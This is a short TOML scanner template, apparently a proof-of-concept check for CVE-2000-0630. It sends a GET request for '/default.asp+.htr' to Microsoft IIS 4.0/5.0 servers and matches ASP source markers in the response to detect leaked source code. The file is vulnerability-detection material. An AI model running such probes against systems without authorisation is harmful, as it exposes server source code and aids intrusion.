[info]
author = "ave"
description = "检测 Microsoft IIS 4.0/5.0 通过 +.htr 后缀泄露 ASP 源码片段漏洞"
id = "POC-AVE-2000-0484"
name = "CVE-2000-0630 PoC"
severity = "medium"
tags = ["ave-2000-0484"]
vuln_id = [
    "CVE-2000-0630",
    "AVE-2000-0484",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/default.asp+.htr"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "%>",
    "<%@",
    "Response.Write",
    "Server.CreateObject",
]

[[poc.requests.matchers]]
expect = true
part = "header"
status = [200]
type = "status"
